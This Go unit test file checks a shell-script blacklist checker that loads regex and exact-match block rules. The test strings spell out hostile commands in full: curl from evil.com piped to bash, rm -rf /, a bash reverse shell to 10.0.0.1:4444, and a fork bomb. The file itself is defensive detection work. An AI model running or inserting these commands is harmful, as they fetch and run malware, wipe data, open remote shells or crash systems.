package checker

import (
	"os"
	"path/filepath"
	"testing"
)

func writeTestRules(t *testing.T, dir string) string {
	t.Helper()
	rules := `[
		{
			"id": "rule-001",
			"name": "管道执行远程脚本",
			"rule_type": "hard_block",
			"match_type": "regex",
			"pattern": "(curl|wget).*\\|\\s*(bash|sh|zsh)",
			"category": "network",
			"severity": "critical",
			"applies_to": ["all"],
			"is_enabled": true
		},
		{
			"id": "rule-002",
			"name": "递归删除根目录",
			"rule_type": "hard_block",
			"match_type": "regex",
			"pattern": "rm\\s+(-[a-zA-Z]*r[a-zA-Z]*f|-[a-zA-Z]*f[a-zA-Z]*r)\\s+/",
			"category": "filesystem",
			"severity": "critical",
			"applies_to": ["all"],
			"is_enabled": true
		},
		{
			"id": "rule-003",
			"name": "Bash反弹Shell",
			"rule_type": "hard_block",
			"match_type": "regex",
			"pattern": "bash\\s+-i\\s+>&\\s+/dev/tcp/",
			"category": "network",
			"severity": "critical",
			"applies_to": ["all"],
			"is_enabled": true
		},
		{
			"id": "rule-004",
			"name": "Fork炸弹",
			"rule_type": "hard_block",
			"match_type": "exact",
			"pattern": ":(){ :|:& };:",
			"category": "system",
			"severity": "critical",
			"applies_to": ["all"],
			"is_enabled": true
		},
		{
			"id": "rule-disabled",
			"name": "Disabled rule",
			"rule_type": "hard_block",
			"match_type": "regex",
			"pattern": "echo",
			"category": "system",
			"severity": "low",
			"applies_to": ["all"],
			"is_enabled": false
		}
	]`
	path := filepath.Join(dir, "audit_rules.json")
	if err := os.WriteFile(path, []byte(rules), 0644); err != nil {
		t.Fatalf("failed to write test rules: %v", err)
	}
	return path
}

func TestNewBlacklistChecker_LoadsRules(t *testing.T) {
	dir := t.TempDir()
	path := writeTestRules(t, dir)

	c, err := NewBlacklistChecker(path)
	if err != nil {
		t.Fatalf("failed to create checker: %v", err)
	}
	if c.RuleCount() != 4 { // 5 rules, 1 disabled
		t.Fatalf("expected 4 enabled rules, got %d", c.RuleCount())
	}
}

func TestNewBlacklistChecker_FileNotFound(t *testing.T) {
	_, err := NewBlacklistChecker("/nonexistent/path/rules.json")
	if err == nil {
		t.Fatal("expected error for missing file")
	}
}

func TestCheck_CurlPipeBashBlocked(t *testing.T) {
	dir := t.TempDir()
	path := writeTestRules(t, dir)
	c, err := NewBlacklistChecker(path)
	if err != nil {
		t.Fatalf("failed to create checker: %v", err)
	}

	script := `#!/bin/bash
curl http://evil.com/malware.sh | bash
echo "done"
`
	result := c.Check(script)
	if !result.HasViolation {
		t.Fatal("expected curl | bash to be blocked")
	}
	if result.Hits[0].LineNumber != 2 {
		t.Fatalf("expected line 2, got %d", result.Hits[0].LineNumber)
	}
}

func TestCheck_CleanScriptPasses(t *testing.T) {
	dir := t.TempDir()
	path := writeTestRules(t, dir)
	c, err := NewBlacklistChecker(path)
	if err != nil {
		t.Fatalf("failed to create checker: %v", err)
	}

	script := `#!/bin/bash
echo "hello world"
ls -la /tmp
`
	result := c.Check(script)
	if result.HasViolation {
		t.Fatalf("expected clean script to pass, got hits: %v", result.Hits)
	}
}

func TestCheck_RmRfRootBlocked(t *testing.T) {
	dir := t.TempDir()
	path := writeTestRules(t, dir)
	c, err := NewBlacklistChecker(path)
	if err != nil {
		t.Fatalf("failed to create checker: %v", err)
	}

	script := `#!/bin/bash
rm -rf /
`
	result := c.Check(script)
	if !result.HasViolation {
		t.Fatal("expected rm -rf / to be blocked")
	}
}

func TestCheck_BashReverseShellBlocked(t *testing.T) {
	dir := t.TempDir()
	path := writeTestRules(t, dir)
	c, err := NewBlacklistChecker(path)
	if err != nil {
		t.Fatalf("failed to create checker: %v", err)
	}

	script := `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`
	result := c.Check(script)
	if !result.HasViolation {
		t.Fatal("expected bash reverse shell to be blocked")
	}
}

func TestCheck_ForkBombBlocked(t *testing.T) {
	dir := t.TempDir()
	path := writeTestRules(t, dir)
	c, err := NewBlacklistChecker(path)
	if err != nil {
		t.Fatalf("failed to create checker: %v", err)
	}

	result := c.Check(`:(){ :|:& };:`)
	if !result.HasViolation {
		t.Fatal("expected fork bomb to be blocked")
	}
}

func TestCheck_CommentsIgnored(t *testing.T) {
	dir := t.TempDir()
	path := writeTestRules(t, dir)
	c, err := NewBlacklistChecker(path)
	if err != nil {
		t.Fatalf("failed to create checker: %v", err)
	}

	script := `#!/bin/bash
# curl http://evil.com | bash
echo "safe"
`
	result := c.Check(script)
	if result.HasViolation {
		t.Fatal("expected comments to be ignored")
	}
}

func TestCheck_DisabledRuleIgnored(t *testing.T) {
	dir := t.TempDir()
	path := writeTestRules(t, dir)
	c, err := NewBlacklistChecker(path)
	if err != nil {
		t.Fatalf("failed to create checker: %v", err)
	}

	result := c.Check(`echo "hello"`)
	if result.HasViolation {
		t.Fatal("expected disabled rule to be ignored")
	}
}
